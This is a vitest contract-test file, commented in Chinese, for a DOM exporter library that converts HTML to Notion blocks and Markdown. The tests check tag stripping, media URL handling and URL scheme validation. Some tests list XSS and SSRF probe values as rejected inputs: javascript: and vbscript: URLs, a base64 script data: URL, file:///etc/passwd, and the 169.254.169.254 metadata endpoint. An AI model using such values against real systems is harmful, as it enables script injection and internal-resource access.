import { describe, it, expect, beforeAll, afterAll } from "vitest";

// 出口面契约测试 —— 依据 spec:project:learnings-006(同构出口不对称防护 — 出口面统一枚举法):
// 契约按**出口面**写一组(合法原样 / 危险输入 / 空), 而非按 finding 单点写。
// 单一原语驻 src/api/DomSpec.js; DOMToNotion 与 HTMLToMarkdown 必须对同一出口面同口径。
// 规则 3: 新增出口必须对照 SURFACE_INVENTORY(见文件末尾)接入 DomSpec 原语,
// 不允许"下一个审计轮次再补"。
//
// 边界: 本文件只断言**行为契约**(输出不泄漏/不丢失/口径一致), 不断言内部函数名或调用形态。

const { DOMToNotion, HTMLToMarkdown } = require("../src/api");
const { DomSpec } = require("../src/api/DomSpec");
const { Utils } = require("../src/utils");

// ---- 桩工具(与 tests/p4-dom-boundary.test.js 同风格: 纯对象 + 局部 Node 常量) ----
// Node 桩必须是**函数**形态: 以普通对象冒充 globalThis.Node 会使 chai/type-detect 的
// `value instanceof 全局构造器` 扫描抛 TypeError(待测代码不受影响)。
const makeNode = () => Object.assign(function Node() {}, { TEXT_NODE: 3, ELEMENT_NODE: 1, COMMENT_NODE: 8 });
let origNode;

beforeAll(() => {
    origNode = globalThis.Node;
    globalThis.Node = makeNode();
});
afterAll(() => {
    if (origNode === undefined) delete globalThis.Node;
    else globalThis.Node = origNode;
});

const textNode = (value) => ({ nodeType: 3, nodeValue: value, textContent: value });
const attrs = (map) => (name) => (Object.prototype.hasOwnProperty.call(map, name) ? map[name] : null);
const element = (tag, children = [], props = {}) => ({
    nodeType: 1,
    tagName: tag.toUpperCase(),
    childNodes: children,
    children,
    getAttribute: () => null,
    querySelector: () => null,
    querySelectorAll: () => [],
    classList: { contains: () => false },
    ...props,
});

const JS_SOURCE = "var leaked = 1;";
const CSS_SOURCE = ".leaked { color: red }";
const NOSCRIPT_SOURCE = "noscript-fallback-text";
const FALLBACK_CONTAINER_SOURCE = "object-fallback-text";

// ===== 出口面 1: 非渲染标签(script / style / noscript / object / embed / canvas) =====
// 每个宿主都必须排除; 两导出器必须同口径
describe("出口面: 非渲染标签在每个宿主内均被排除", () => {
    const SKIPPED = [
        ["script", JS_SOURCE],
        ["style", CSS_SOURCE],
        ["noscript", NOSCRIPT_SOURCE],
    ];
    // 宿主面: 段落 / li / 表格单元格 / blockquote / 未匹配容器 / div 根
    const HOSTS = [
        ["div", (child) => element("div", [child])],
        ["p", (child) => element("p", [child])],
        ["li", (child) => element("li", [child])],
        ["td", (child) => element("td", [child])],
        ["blockquote", (child) => element("blockquote", [child])],
        ["article(未匹配容器)", (child) => element("article", [child])],
    ];
    const skipChild = (tag, source) => element(tag, [textNode(source)], { getAttribute: attrs({}) });

    it("DOMToNotion: 源码不进 rich_text", () => {
        for (const [hostName, build] of HOSTS) {
            for (const [tag, source] of SKIPPED) {
                const rt = DOMToNotion.serializeRichText(build(skipChild(tag, source)));
                const joined = rt.map((r) => r.text.content).join("");
                expect(`${hostName} | <${tag}> | ${joined}`).toBe(`${hostName} | <${tag}> | `);
            }
        }
    });

    it("HTMLToMarkdown: 源码不进 Markdown", () => {
        for (const [hostName, build] of HOSTS) {
            for (const [tag, source] of SKIPPED) {
                const md = HTMLToMarkdown._convertNode(build(skipChild(tag, source)));
                // 不从简为“输出为空”: 空 <li> 等宿主自身会产出合法标记(如 "-"),
                // 契约是源码不得泄漏进正文
                expect(`${hostName} | <${tag}> | ${md}`).not.toContain(source);
            }
        }
    });

    it("cookedToBlocks: 透明下钻不把源码并入正文(GenericExtractor 兜底源)", () => {
        // 该路径(未匹配容器/list 容器下钻)此前无跳过判据 —— 而 GenericExtractor 的
        // body.innerHTML 兜底源普遍含 <style>, 且该路径是 cookedToBlocks 的入口
        const origParser = globalThis.DOMParser;
        const body = element("body", [
            skipChild("style", CSS_SOURCE),
            skipChild("script", JS_SOURCE),
            element("p", [textNode("正文")]),
        ]);
        globalThis.DOMParser = function () { return { parseFromString: () => ({ body }) }; };
        let blocks;
        try {
            blocks = DOMToNotion.cookedToBlocks("<p>marker</p>", "external");
        } finally {
            if (origParser === undefined) delete globalThis.DOMParser; else globalThis.DOMParser = origParser;
        }
        const text = blocks.map((b) => ((b.paragraph || {}).rich_text || []).map((r) => r.text.content).join("")).join("|");
        expect(`${text} | ${text.includes(CSS_SOURCE)} | ${text.includes(JS_SOURCE)}`).toBe("正文 | false | false");
    });

    it("单一判据: 跳过表只有 DomSpec.SKIP_TAGS 一处", () => {
        expect([...DomSpec.SKIP_TAGS].sort()).toEqual(["canvas", "embed", "noscript", "object", "script", "style"]);
        expect(DomSpec.isSkippedNode(element("script"))).toBe(true);
        expect(DomSpec.isSkippedNode(element("STYLE"))).toBe(true);
        expect(DomSpec.isSkippedNode(element("div"))).toBe(false);
        expect(DomSpec.isSkippedNode(element("p"))).toBe(false);
    });
});

// ===== 出口面 2: 媒体地址回退口径(src / data-src / <source src>) =====
// 三个回退必须对所有媒体元素同口径, 且两导出器一致
describe("出口面: 媒体地址回退", () => {
    const IMAGE_SRC = "https://cdn.example.com/pic.png";
    const VIDEO_SRC = "https://cdn.example.com/clip.mp4";
    const AUDIO_SRC = "https://cdn.example.com/sound.mp3";
    const sourceChild = (src) => element("source", [], { getAttribute: attrs({ src }) });
    const withSource = (src) => ({ querySelector: () => sourceChild(src) });

    it("DomSpec.mediaSrc 覆盖 src / data-src / <source src>", () => {
        expect(DomSpec.mediaSrc(element("img", [], { getAttribute: attrs({ src: "s" }) }))).toBe("s");
        expect(DomSpec.mediaSrc(element("img", [], { getAttribute: attrs({ "data-src": "d" }) }))).toBe("d");
        expect(DomSpec.mediaSrc(element("img", [], { getAttribute: attrs({ src: "s", "data-src": "d" }) }))).toBe("s");
        expect(DomSpec.mediaSrc(element("video", [], { getAttribute: attrs({}), ...withSource("v") }))).toBe("v");
        expect(DomSpec.mediaSrc(element("video", [], { getAttribute: attrs({}) }))).toBe("");
        expect(DomSpec.mediaSrc(null)).toBe("");
    });

    it("DOMToNotion: 懒加载图与 <source> 型视频/音频都产出块", () => {
        const lazy = [];
        DOMToNotion._cookImage(element("img", [], { getAttribute: attrs({ "data-src": IMAGE_SRC }) }), lazy, "external");
        expect(lazy.map((b) => b.type)).toEqual(["image"]);

        const video = [];
        DOMToNotion._cookVideo(element("video", [], { getAttribute: attrs({}), ...withSource(VIDEO_SRC) }), video, "external");
        expect(video.length).toBe(1);

        const audio = [];
        DOMToNotion._cookAudio(element("audio", [], { getAttribute: attrs({}), ...withSource(AUDIO_SRC) }), audio, "external");
        expect(audio.length).toBe(1);
    });

    it("HTMLToMarkdown: 同一批输入给出同口径链接", () => {
        expect(HTMLToMarkdown._convertNode(element("img", [], { getAttribute: attrs({ "data-src": IMAGE_SRC }) }))).toContain(IMAGE_SRC);
        expect(HTMLToMarkdown._convertNode(element("video", [], { getAttribute: attrs({}), ...withSource(VIDEO_SRC) }))).toContain(VIDEO_SRC);
        expect(HTMLToMarkdown._convertNode(element("audio", [], { getAttribute: attrs({}), ...withSource(AUDIO_SRC) }))).toContain(AUDIO_SRC);
        expect(HTMLToMarkdown._convertNode(element("iframe", [], { getAttribute: attrs({ src: "https://cdn.example.com/embed" }) }))).toContain("https://cdn.example.com/embed");
    });

    it("危险 scheme 两侧都拒绝(不生成链接/不产出块)", () => {
        const dangerous = ["javascript:alert(1)", "data:text/html;base64,PHNjcmlwdD4=", "http://127.0.0.1/x.png", "http://169.254.169.254/latest/meta-data"];
        for (const src of dangerous) {
            const blocks = [];
            DOMToNotion._cookImage(element("img", [], { getAttribute: attrs({ src }) }), blocks, "external");
            expect(`${src} -> ${blocks.length}`).toBe(`${src} -> 0`);
            expect(HTMLToMarkdown._convertNode(element("img", [], { getAttribute: attrs({ src }) }))).not.toContain("](");
        }
    });
});

// ===== 出口面 3: 媒体采集的"自身即媒体" =====
// querySelectorAll 只查后代 —— 宿主元素自身即媒体时必须同样被消费
describe("出口面: 媒体采集覆盖自身与后代", () => {
    it("DomSpec.eachMedia 自身即媒体时同样回调", () => {
        const seen = [];
        DomSpec.eachMedia(element("img", [], { getAttribute: attrs({ src: "https://cdn.example.com/x.png" }) }), (node, kind) => seen.push(kind));
        expect(seen).toEqual(["img"]);
    });

    it("DomSpec.eachMedia 对非媒体宿主只报后代", () => {
        const seen = [];
        const host = element("ul", [element("img", [], { getAttribute: attrs({}) })], {
            querySelectorAll: (sel) => (sel === "img" ? [element("img", [], { getAttribute: attrs({}) })] : []),
        });
        DomSpec.eachMedia(host, (node, kind) => seen.push(kind));
        expect(seen).toEqual(["img"]);
    });

    it("_consumeInlineMedia: 自身为 a.attachment 时同样产出 file 块", () => {
        const blocks = [];
        DOMToNotion._consumeInlineMedia(
            element("a", [], {
                getAttribute: attrs({ href: "https://example.com/doc.pdf" }),
                classList: { contains: (c) => c === "attachment" },
                textContent: "doc.pdf",
            }),
            blocks,
            "external",
        );
        expect(blocks.map((b) => b.type)).toEqual(["file"]);
    });
});

// ===== 出口面 4: 地址判据(相对地址补齐 / scheme 白名单) =====
// R15 实缺陷(本组是它的回归锁, 对应变异: 去掉 safeUrl 的 scheme 前置判定 / 去掉原点补齐):
//   ①Markdown 侧只放行 "http" 前缀 → 相对(/uploads/x.png)与协议相对(//cdn/x.png)媒体与
//     链接被整体判为"非公网"静默丢弃(Notion 侧正常);
//   ②Utils.absoluteUrl 对未知 scheme 一律原点补齐 → javascript:/data:/file: 在公网原点页面上
//     被拼成 "https://<origin>/<scheme>:…" 并通过 validatePageExternalUrl(旧断言仅因测试环境
//     origin=http://localhost 是内网 host 才显绿 —— 假绿)。
// 断言必须在**公网原点**下进行, 否则测不出 scheme 前置判定。
const imgSrc = (src) => element("img", [], { getAttribute: attrs({ src }) });
const anchor = (href, text) => element("a", [textNode(text)], { getAttribute: attrs({ href }), textContent: text });
const attachment = (href, text) => element("a", [textNode(text)], {
    getAttribute: attrs({ href }),
    textContent: text,
    classList: { contains: (c) => c === "attachment" },
});

describe("出口面: 地址判据(相对地址补齐 / scheme 白名单)", () => {
    const PUBLIC_ORIGIN = "https://linux.do";
    let origLocation;
    beforeAll(() => {
        origLocation = { ...globalThis.window.location };
        Object.assign(globalThis.window.location, { origin: PUBLIC_ORIGIN, protocol: "https:", hostname: "linux.do" });
    });
    afterAll(() => {
        Object.assign(globalThis.window.location, origLocation);
    });

    const DANGEROUS = ["javascript:alert(1)", "data:text/html;base64,PHN2Zz4=", "vbscript:msgbox", "file:///etc/passwd", "mailto:a@b.c"];

    it("公网原点下危险 scheme 不被原点补齐放行(两导出器)", () => {
        for (const raw of DANGEROUS) {
            expect(`${raw} -> ${JSON.stringify(DomSpec.safeUrl(raw))}`).toBe(`${raw} -> ""`);
            const blocks = [];
            DOMToNotion._cookImage(imgSrc(raw), blocks, "external");
            expect(`${raw} -> ${blocks.length}`).toBe(`${raw} -> 0`);
            const md = HTMLToMarkdown._convertNode(imgSrc(raw));
            expect(`${raw} -> ${md.includes("](")}`).toBe(`${raw} -> false`);
            // 链接面同口径: 危险 href 不得写成链接(文本保留)
            expect(HTMLToMarkdown._convertNode(anchor(raw, "点"))).toBe("点");
            const rt = DOMToNotion.serializeRichText(anchor(raw, "点"));
            expect(rt.map((r) => r.text.content).join("")).toBe("点");
            expect(rt.some((r) => r.text.link)).toBe(false);
        }
    });

    it("相对 / 协议相对地址两导出器同口径补齐", () => {
        const cases = [
            ["//cdn.example.com/x.png", "https://cdn.example.com/x.png"],
            ["/uploads/x.png", `${PUBLIC_ORIGIN}/uploads/x.png`],
        ];
        for (const [raw, abs] of cases) {
            expect(`${raw} -> ${DomSpec.safeUrl(raw)}`).toBe(`${raw} -> ${abs}`);
            const blocks = [];
            DOMToNotion._cookImage(imgSrc(raw), blocks, "external");
            expect(blocks.map((b) => b.image.external.url)).toEqual([abs]);
            expect(HTMLToMarkdown._convertNode(imgSrc(raw))).toBe(`![](${abs})`);
        }
        // 链接面: 相对 href 不再降级纯文本
        expect(DomSpec.safeUrl("/t/2")).toBe(`${PUBLIC_ORIGIN}/t/2`);
        expect(HTMLToMarkdown._convertNode(anchor("/t/2", "帖"))).toBe(`[帖](${PUBLIC_ORIGIN}/t/2)`);
        expect(DOMToNotion.serializeRichText(anchor("/t/2", "帖"))[0].text.link.url).toBe(`${PUBLIC_ORIGIN}/t/2`);
        // 附件(href 面)同判据
        const att = [];
        DOMToNotion._cookAttachment(attachment("/uploads/doc.pdf", "doc.pdf"), att, "external");
        expect(att.map((b) => b.file.external.url)).toEqual([`${PUBLIC_ORIGIN}/uploads/doc.pdf`]);
    });

    it("补齐后仍需过公网校验(内网/环回/169.254 两侧都拒)", () => {
        for (const raw of ["http://127.0.0.1/x.png", "http://169.254.169.254/x", "http://10.0.0.5/x", "http://localhost/x"]) {
            expect(`${raw} -> ${DomSpec.safeUrl(raw)}`).toBe(`${raw} -> `);
            const blocks = [];
            DOMToNotion._cookImage(imgSrc(raw), blocks, "external");
            expect(blocks.length).toBe(0);
            // wave18 共识(w3 glm + qwen): 有候选地址但被判拒时 Markdown 出口不再零产出
            // (与同文件 iframe/video/audio 及 Notion 出口 _cookBlockImage 同口径)
            expect(HTMLToMarkdown._convertNode(imgSrc(raw))).toBe("[图片已拒（非公网 http(s) 地址）]");
        }
        // 片段链接保持纯文本(两导出器一致; DOMToNotion 另有 # 分支但判据结果相同)
        expect(DomSpec.safeUrl("#top")).toBe("");
        expect(HTMLToMarkdown._convertNode(anchor("#top", "顶"))).toBe("顶");
    });

    it("已绝对 http(s) 地址大小写不敏感(仍走同一判据)", () => {
        expect(DomSpec.safeUrl("HTTP://cdn.example.com/x.png")).toBe("HTTP://cdn.example.com/x.png");
        expect(DomSpec.safeUrl("HTTPS://cdn.example.com/x.png")).toBe("HTTPS://cdn.example.com/x.png");
    });

    it("四类媒体在 Markdown 侧同口径(相对地址补齐后写出)", () => {
        const base = `${PUBLIC_ORIGIN}/`;
        expect(HTMLToMarkdown._convertNode(element("video", [], { getAttribute: attrs({ src: "/s.mp4" }) }))).toBe(`[视频](${base}s.mp4)\n\n`);
        expect(HTMLToMarkdown._convertNode(element("audio", [], { getAttribute: attrs({ src: "/s.mp3" }) }))).toBe(`[音频](${base}s.mp3)\n\n`);
        expect(HTMLToMarkdown._convertNode(element("iframe", [], { getAttribute: attrs({ src: "/embed" }) }))).toBe(`[嵌入内容](${base}embed)\n\n`);
        const blocks = [];
        DOMToNotion._cookVideo(element("video", [], { getAttribute: attrs({ src: "/s.mp4" }) }), blocks, "external");
        expect(blocks.map((b) => b.video.external.url)).toEqual([`${base}s.mp4`]);
    });

    it("地址回退仍经同一入口(data-src / <source src>)", () => {
        const lazy = element("img", [], { getAttribute: attrs({ "data-src": "//cdn.example.com/lazy.png" }) });
        expect(DomSpec.mediaUrl(lazy)).toBe("https://cdn.example.com/lazy.png");
        const withSource = element("video", [], {
            getAttribute: attrs({}),
            querySelector: () => element("source", [], { getAttribute: attrs({ src: "/v.mp4" }) }),
        });
        expect(DomSpec.mediaUrl(withSource)).toBe(`${PUBLIC_ORIGIN}/v.mp4`);
    });
});

// ===== 出口面 5: 单行上下文(记录在案的双出口面差异) =====
// Markdown 语法是单行的(标题/表格单元格内的 CR/LF 会破坏结构) → obsidian 折叠;
// Notion rich_text 本身可以承载 "\n"(br 是硬换行) → DOMToNotion 不折叠。
// 两个折叠原语语义**不可互代**: collapseOneLine(链接标签/alt) 需剔方括号以免破坏链接结构,
// foldToSingleLine(标题/单元格) 不可剔("[RFC]" 是合法标题内容)。
describe("出口面: 单行上下文(折叠语义与已登记差异)", () => {
    const withBreak = (tag) => element(tag, [textNode("a"), element("br"), textNode("b")]);

    it("Markdown 侧单行位置折叠 CR/LF(标题 / 表格单元格)", () => {
        expect(HTMLToMarkdown._convertNode(withBreak("h2")).split("\n")[0]).toBe("## a b");
        const table = element("table", [element("tbody", [element("tr", [withBreak("td")])])]);
        expect(HTMLToMarkdown._convertNode(table).split("\n")[0]).toBe("| a b |");
    });

    it("Notion 侧保留换行(rich_text 承载 \\n, 不引入折叠)", () => {
        const blocks = [];
        DOMToNotion._cookHeading(withBreak("h2"), blocks, "external");
        expect(blocks[0].heading_2.rich_text.map((r) => r.text.content).join("")).toBe("a\nb");
    });

    it("折叠原语不可互换: foldToSingleLine 保方括号原样, collapseOneLine 转义方括号", () => {
        expect(DomSpec.foldToSingleLine("[RFC]\r\n8601")).toBe("[RFC] 8601");
        expect(DomSpec.foldToSingleLine("a\rb")).toBe("a b");
        expect(DomSpec.foldToSingleLine(null)).toBe("");
        // wave17 共识(glm): 链接标签面由「删除方括号」改为「反斜杠转义」—— 删除会破坏标签内的
        // 嵌套 Markdown(可点击图片 [![alt](u)](link) 被改写成损坏文本); 转义同样阻止 ]( 逃逸链接语法
        expect(DomSpec.collapseOneLine("[RFC] 8601")).toBe("\\[RFC\\] 8601");
        expect(DomSpec.foldToSingleLine("[RFC] 8601")).not.toBe(DomSpec.collapseOneLine("[RFC] 8601"));
    });
});

// ===== 出口面 6: 媒体宿主矩阵 =====
// 每个宿主都必须经同一条采集入口(DomSpec.eachMedia)消费媒体: 恰一次 + 同类保文档序。
// 对应变异: eachMedia 去掉"自身即媒体"分派 / 交换类序 / 删某一类查询。
describe("出口面: 媒体宿主矩阵(恰一次 / 同类保序 / 不丢失)", () => {
    const P1 = "https://cdn.example.com/p1.png";
    const P2 = "https://cdn.example.com/p2.png";
    const DOC = "https://cdn.example.com/doc.pdf";
    const VID = "https://cdn.example.com/v.mp4";
    const videoSrc = (src) => element("video", [], { getAttribute: attrs({ src }) });
    // 同类两个 + 附件 + 视频: 既测"每节点恰一次", 也测"同类内文档序"
    const mediaChildren = () => [textNode("marker"), imgSrc(P1), imgSrc(P2), attachment(DOC, "doc.pdf"), videoSrc(VID)];

    // 桩宿主按真实 DOM 语义回答后代查询(否则采集器无输入)
    const matches = (node, sel) => {
        const t = String(node.tagName || "").toLowerCase();
        if (sel === "img") return t === "img";
        if (sel === "a.attachment") return t === "a" && !!node.classList && node.classList.contains("attachment");
        return t === sel;
    };
    const queryAll = (root, sel) => {
        const out = [];
        const walk = (n) => (n.children || []).forEach((c) => { if (matches(c, sel)) out.push(c); walk(c); });
        walk(root);
        return out;
    };
    const withQuery = (node) => {
        node.querySelectorAll = (sel) => queryAll(node, sel);
        (node.children || []).forEach(withQuery);
        return node;
    };
    const mdCount = (md, url) => md.split(url).length - 1;

    const HOSTS = [
        ["段落", (kids) => element("p", kids)],
        ["li", (kids) => element("ul", [element("li", kids)])],
        ["ul 非 li 直属子", (kids) => element("ul", kids)],
        ["表格单元格", (kids) => element("table", [element("tbody", [element("tr", [element("td", kids)])])])],
        ["blockquote", (kids) => element("blockquote", kids)],
        ["未匹配容器(article)", (kids) => element("article", kids)],
    ];

    for (const [name, build] of HOSTS) {
        it(`${name}: 恰一次 + 同类保序 + 两导出器同口径`, () => {
            const host = withQuery(build(mediaChildren()));
            const blocks = [];
            DOMToNotion._consumeInlineMedia(host, blocks, "external");
            const urls = blocks.map((b) => ((b.image || b.video || b.file || {}).external || {}).url || "");
            expect(`${name} | ${urls.join(" ")}`).toBe(`${name} | ${P1} ${P2} ${DOC} ${VID}`);
            const md = HTMLToMarkdown._convertNode(host);
            for (const url of [P1, P2, DOC, VID]) {
                expect(`${name} | ${url} | ${mdCount(md, url)}`).toBe(`${name} | ${url} | 1`);
            }
        });
    }

    it("body 根: cookedToBlocks 端到端同口径", () => {
        const origParser = globalThis.DOMParser;
        const body = withQuery(element("body", [element("p", mediaChildren())]));
        globalThis.DOMParser = function () { return { parseFromString: () => ({ body }) }; };
        let blocks;
        try {
            blocks = DOMToNotion.cookedToBlocks("<p>marker</p>", "external");
        } finally {
            if (origParser === undefined) delete globalThis.DOMParser; else globalThis.DOMParser = origParser;
        }
        const urls = blocks.map((b) => ((b.image || b.video || b.file || {}).external || {}).url || "").filter(Boolean);
        expect(urls).toEqual([P1, P2, DOC, VID]);
    });

    it("自身即媒体: 宿主元素本身被消费(不依赖后代查询)", () => {
        const blocks = [];
        DOMToNotion._consumeInlineMedia(imgSrc(P1), blocks, "external");
        expect(blocks.map((b) => b.image.external.url)).toEqual([P1]);
        const att = [];
        DOMToNotion._consumeInlineMedia(attachment(DOC, "doc.pdf"), att, "external");
        expect(att.map((b) => b.file.external.url)).toEqual([DOC]);
    });
});

// ===== 出口面 7: 有序遍历 =====
describe("出口面: 有序遍历(文本节点不丢且保序)", () => {
    it("eachChildOrdered 含文本节点、按文档序、空值安全", () => {
        const seen = [];
        DomSpec.eachChildOrdered(element("div", [textNode("t1"), element("b"), textNode("t2")]), (n) => seen.push(n.nodeValue || n.tagName));
        expect(seen).toEqual(["t1", "B", "t2"]);
        const empty = [];
        DomSpec.eachChildOrdered(null, (n) => empty.push(n));
        expect(empty).toEqual([]);
    });

    it("script 剔除但相邻文本按文档序保留(两导出器)", () => {
        const tree = element("div", [textNode("前"), element("script", [textNode("var x=1;")]), textNode("后")]);
        // 真实 DOM 语义: children 只含元素, childNodes 含文本 —— 桩必须同样区分,
        // 否则"按 children 遍历"的变异在桩上不可观测(等价变异假象)
        tree.children = tree.children.filter((c) => c.nodeType === 1);
        expect(DOMToNotion.serializeRichText(tree).map((r) => r.text.content).join("")).toBe("前后");
        expect(HTMLToMarkdown._convertNode(tree)).toBe("前后");
    });
});

// ===== 出口面 8: emoji 判据 =====
// emoji 判据单一来源 DomSpec.emojiNameOf; 消费方只有 DOMToNotion(转 emoji 文本)。
// obsidian 侧无 emoji 判据: 其图片分支按普通图片写出 emoji 图链接(不失信息, 形态不同,
// 已登记在清单 note 中)。变异: emojiNameOf 返回 null / set 目录收窄。
describe("出口面: emoji 判据(单一来源 DomSpec.emojiNameOf)", () => {
    const EMOJI = "/images/emoji/win10/smile.png";

    it("emoji 图不落图片块, 转 emoji 文本", () => {
        expect(DomSpec.emojiNameOf(EMOJI)).toBe("smile");
        expect(DomSpec.emojiNameOf("/images/emoji/twitter/+1.png")).toBe("+1");
        expect(DomSpec.emojiNameOf("/uploads/x.png")).toBe(null);
        const blocks = [];
        DOMToNotion._cookImage(imgSrc(EMOJI), blocks, "external");
        expect(blocks.length).toBe(0);
        const p = element("p", [textNode("hi "), imgSrc(EMOJI)]);
        expect(DOMToNotion.serializeRichText(p).map((r) => r.text.content).join("")).toContain("😊");
    });
});

// ===== wave15 补口: 容器分支不静默丢弃 + 缩进排版不入列表行 =====
// 均属"同构出口各自实现"的余留面: 容器层在非 li 元素 / 无 blockquote / 空分区 / 缩进
// 空白节点上分支, 此前直接丢弃内容或原样透传缩进 —— 内容丢失与 Markdown 结构退化。
describe("wave15: 容器分支不静默丢弃 + 缩进排版", () => {
    it("_cookList: ul/ol 直属文本落段落, 纯空白节点不产块", () => {
        const blocks = [];
        DOMToNotion._cookList(
            element("ul", [textNode("前"), element("li", [textNode("a")]), textNode("\n   "), element("li", [textNode("b")]), textNode("后")]),
            blocks, "external",
        );
        expect(blocks.map((b) => b.type).join(" ")).toBe("paragraph bulleted_list_item bulleted_list_item paragraph");
        const text = blocks.map((b) => Object.keys(b).filter((k) => k !== "type")
            .map((k) => (b[k].rich_text || []).map((r) => r.text.content).join("")).join("")).join("|");
        expect(text).toBe("前|a|b|后");
    });

    it("_cookAsideQuote: 无内层 blockquote 时以 aside 自身为引用源", () => {
        const blocks = [];
        DOMToNotion._cookAsideQuote(
            element("aside", [element("p", [textNode("引用文本")])], { classList: { contains: (c) => c === "quote" } }),
            blocks, "external",
        );
        expect(blocks.map((b) => b.type).join(" ")).toBe("quote");
        expect(blocks[0].quote.rich_text.map((r) => r.text.content).join("")).toBe("引用文本");
        const withBq = [];
        DOMToNotion._cookAsideQuote(
            element("aside", [element("blockquote", [textNode("原式")])], {
                classList: { contains: (c) => c === "quote" },
                querySelector: (sel) => (sel === "blockquote" ? element("blockquote", [textNode("原式")]) : null),
            }),
            withBq, "external",
        );
        expect(withBq.map((b) => b.type).join(" ")).toBe("quote");
    });

    it("_cookTable: 空 thead 不置表头, 有行 thead 仍置表头", () => {
        const empty = [];
        DOMToNotion._cookTable(element("table", [element("thead"),
            element("tbody", [element("tr", [element("td", [textNode("data")])], { closest: () => null })])]), empty, "external");
        expect(empty.map((b) => `${b.type}:${b.table.has_column_header}:${b.table.children.length}`).join(" ")).toBe("table:false:1");
        const filled = [];
        DOMToNotion._cookTable(element("table", [element("thead", [element("tr", [element("th", [textNode("H")])], { closest: () => null })])]), filled, "external");
        expect(filled.map((b) => `${b.type}:${b.table.has_column_header}`).join(" ")).toBe("table:true");
    });

    it("obsidian: 缩进排版的 ol/ul 不把项间空白拼进列表行", () => {
        const prettyOl = element("ol", [textNode("\n    "), element("li", [textNode("a")]), textNode("\n    "), element("li", [textNode("b")]), textNode("\n")]);
        expect(HTMLToMarkdown._convertNode(prettyOl)).toBe("1. a\n2. b\n\n");
        const prettyUl = element("ul", [textNode("\n    "), element("li", [textNode("a")]), textNode("\n    "), element("li", [textNode("b")]), textNode("\n")]);
        expect(HTMLToMarkdown._convertNode(prettyUl)).toBe("- a\n- b\n");
    });

    it("obsidian: pre 语言名对 SVG className 不崩溃且保留 +/#", () => {
        const svgCode = { nodeType: 1, tagName: "CODE", className: { toString: () => "[object SVGAnimatedString]" }, getAttribute: () => null };
        const svgPre = { nodeType: 1, tagName: "PRE", querySelector: () => svgCode, childNodes: [], textContent: "int main(){}" };
        expect(() => HTMLToMarkdown._convertNode(svgPre)).not.toThrow();
        const cxx = element("pre", [], {
            querySelector: () => element("code", [], { getAttribute: attrs({ class: "language-c++" }) }),
            textContent: "int main(){}",
        });
        expect(HTMLToMarkdown._convertNode(cxx)).toContain("```c++");
    });
});

// ===== wave16: 修复后复验收敛(三模型第二轮) =====
describe("wave16: 修复后复验收敛", () => {
    const REAL = "https://cdn.example.com/real.png";

    it("DomSpec.mediaSrc: 占位 src(data:/about:) 不阻断懒加载回退", () => {
        const placeholder = element("img", [], { getAttribute: attrs({ src: "data:image/gif;base64,R0lGOD", "data-src": REAL }) });
        expect(DomSpec.mediaSrc(placeholder)).toBe(REAL);
        expect(DomSpec.mediaUrl(placeholder)).toBe(REAL);
        const blocks = [];
        DOMToNotion._cookImage(placeholder, blocks, "external");
        expect(blocks.map((b) => b.image.external.url)).toEqual([REAL]);
        // 无回退可用的占位 src 仍被地址判据拒绝(不因放宽而放行)
        expect(DomSpec.mediaUrl(element("img", [], { getAttribute: attrs({ src: "data:image/gif;base64,R0lGOD" }) }))).toBe("");
        expect(DomSpec.mediaUrl(element("img", [], { getAttribute: attrs({ src: "about:blank" }) }))).toBe("");
    });

    it("DomSpec.textWithBreaks: <br> 在纯文本上下文产出换行", () => {
        expect(DomSpec.textWithBreaks(element("code", [textNode("line1"), element("br"), textNode("line2")]))).toBe("line1\nline2");
        expect(DomSpec.textWithBreaks(element("pre", [element("span", [textNode("a")]), textNode("b")]))).toBe("ab");
        expect(DomSpec.textWithBreaks(null)).toBe("");
    });

    it("_cookCode: 代码块内 <br> 换行不丢失", () => {
        const code = () => element("code", [textNode("a"), element("br"), textNode("b")], { getAttribute: () => null });
        const pre = element("pre", [code()], { querySelector: (sel) => (sel === "code" ? code() : null) });
        const blocks = [];
        DOMToNotion._cookCode(pre, blocks);
        expect(blocks.map((b) => b.code.rich_text.map((r) => r.text.content).join("")).join("")).toBe("a\nb");
    });

    it("obsidian: pre 内 <br> 换行不丢失", () => {
        const code = () => element("code", [textNode("a"), element("br"), textNode("b")], { getAttribute: () => null });
        const pre = element("pre", [code()], { querySelector: () => code() });
        expect(HTMLToMarkdown._convertNode(pre)).toContain("a\nb");
    });

    it("_cookAttachment: 被地址判据拒绝时不丢可见文本", () => {
        const blocks = [];
        DOMToNotion._cookAttachment(attachment("http://169.254.169.254/latest/meta-data", "file.txt"), blocks, "external");
        const dumped = JSON.stringify(blocks);
        expect(dumped).toContain("file.txt");
        expect(dumped.includes("169.254.169.254")).toBe(false);
        // 合法地址仍产出 file 块(原行为不变)
        const ok = [];
        DOMToNotion._cookAttachment(attachment("https://cdn.example.com/doc.pdf", "doc.pdf"), ok, "external");
        expect(ok.map((b) => b.type)).toEqual(["file"]);
    });

    it("_cookAsideQuote: 多个 blockquote 都产出引用块", () => {
        const aside = element("aside", [element("blockquote", [textNode("第一")]), element("blockquote", [textNode("第二")])], {
            classList: { contains: (c) => c === "quote" },
        });
        const blocks = [];
        DOMToNotion._cookAsideQuote(aside, blocks, "external");
        expect(blocks.map((b) => b.type).join(" ")).toBe("quote quote");
        expect(blocks.map((b) => b.quote.rich_text.map((r) => r.text.content).join("")).join("|")).toBe("第一|第二");
    });

    it("_cookLightbox: 容器内多图都不丢失", () => {
        const A = "https://cdn.example.com/a.png";
        const B = "https://cdn.example.com/b.png";
        const img = (src) => element("img", [], { getAttribute: attrs({ src }) });
        // wave17: 媒体采集改为沿 childNodes 文档序递归(不再依赖 querySelectorAll 复合选择器),
        // 粧须提供真实子节点树才能反映真实 DOM 行为
        const wrapper = element("div", [img(A), img(B)], {
            classList: { contains: (c) => c === "lightbox-wrapper" },
            querySelector: () => img(A),
            querySelectorAll: (sel) => (sel === "img" ? [img(A), img(B)] : []),
        });
        const blocks = [];
        DOMToNotion._cookLightbox(wrapper, blocks, "external");
        expect(blocks.map((b) => b.image.external.url)).toEqual([A, B]);
    });

    it("_cookTable: 空 thead 时以数据首行全 th 判表头", () => {
        const th = () => element("th", [textNode("H")], { closest: () => null });
        const td = (v) => element("td", [textNode(v)], { closest: () => null });
        const blocks = [];
        DOMToNotion._cookTable(element("table", [element("thead"),
            element("tbody", [element("tr", [th(), th()], { closest: () => null }),
                element("tr", [td("1"), td("2")], { closest: () => null })])]), blocks, "external");
        expect(blocks.map((b) => `${b.type}:${b.table.has_column_header}`).join(" ")).toBe("table:true");
